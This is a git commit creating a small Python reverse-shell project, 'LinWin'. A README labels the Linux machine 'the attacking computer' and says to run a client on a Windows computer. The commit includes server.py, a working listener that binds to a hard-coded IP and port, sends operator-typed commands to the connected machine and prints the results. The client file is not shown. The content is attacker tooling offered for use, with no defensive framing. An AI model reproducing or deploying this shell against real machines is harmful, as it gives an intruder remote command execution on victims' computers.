82e4f303a3cc7d44782e74636505ee5621c08e76
Marcio <mecastillo00@gmail.com>
2021-08-19 18:04:00 -0400

    first commit

---
+++ README.md
@@ -0,0 +1,13 @@
+# LinWin - Reverse shell
+
+Linux to Windows reverse shell
+
+## Usage
+
+```bash
+# run on a linux host (as the attacking computer)
+python3 server.py
+
+# run on a Windows computer
+python3 client.py
+```
---
+++ server.py
@@ -0,0 +1,41 @@
+import socket
+
+SERVER_HOST = "192.168.1.208"
+SERVER_PORT = 5003
+BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+# separator string for sending 2 messages in one go
+SEPARATOR = "<sep>"
+# create a socket object
+s = socket.socket()
+
+# bind the socket to all ip addresses of this host
+s.bind((SERVER_HOST, SERVER_PORT))
+
+# listen fot connections
+s.listen(5)
+print(f"Listening as {SERVER_HOST}:{SERVER_PORT}...")
+
+# accept any connections attempted
+client_socket, client_address = s.accept()
+print(f"{client_address[0]}:{client_address[1]} Connected!")
+
+cwd = client_socket.recv(BUFFER_SIZE).decode()
+print("[+] Current working directory: ", cwd)
+
+while True:
+    # get the command from prompt
+    command = input(f"{cwd} $> ")
+    if not command.strip():
+        # empty command
+        continue
+    # send the command to the client
+    client_socket.send(command.encode())
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+        break
+    # retrieve command results
+    output = client_socket.recv(BUFFER_SIZE).decode()
+    #split command output and current directory
+    results, cwd = output.split(SEPARATOR)
+    # print output
+    print(results)
